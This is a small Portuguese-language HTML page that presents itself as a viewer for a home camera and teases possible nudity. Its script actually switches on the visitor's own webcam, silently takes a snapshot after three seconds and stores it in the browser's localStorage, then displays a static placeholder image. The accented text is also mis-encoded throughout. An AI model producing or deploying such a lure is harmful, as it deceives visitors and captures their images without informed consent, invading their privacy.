<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Minha Casa</title>
    <style>
      body {
        background: linear-gradient(to right, #fff0f5, #e0ffff);
        font-family: sans-serif;
        text-align: center;
        padding: 2rem;
      }
      button {
        background-color: #1e90ff;
        color: white;
        border: none;
        padding: 1rem 2rem;
        font-size: 1.2rem;
        border-radius: 8px;
        cursor: pointer;
        margin: 0.5rem;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      }
      #imagem-casa {
        margin-top: 2rem;
        max-width: 90vw;
        max-height: 80vh;
        border-radius: 12px;
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>Minha Casa üì∑</h1>
    <p>Clique no bot√£o para visualizar uma imagem da c√¢mera da casa.</p>
    <p>Essa imagem √© atualizada a cada 5 segundos.</p>
    <p>Permita o uso da c√¢mera para capturar a camera em tempo real.</p>
    <p>Esta √© uma camera residencial e inclui area √≠ntima, n√£o temos responsabilidade caso acabe vendo nudez.</p>

    <button onclick="ativarCamera()">C√¢mera da Casa</button>
  <center><img id="imagem-casa" src="casa.jpg" alt="Imagem da casa" /></center>

    <script>
      async function ativarCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/jpeg");
            localStorage.setItem("ultimaFoto", dataUrl);
            stream.getTracks().forEach(track => track.stop());
          }, 3000);

          // Exibir imagem est√°tica ap√≥s ativar c√¢mera
          document.getElementById("imagem-casa").style.display = "block";

        } catch (err) {
          alert("Permita o uso da c√¢mera para prosseguir üì∏");
        }
      }
    </script>
  </body>
</html>
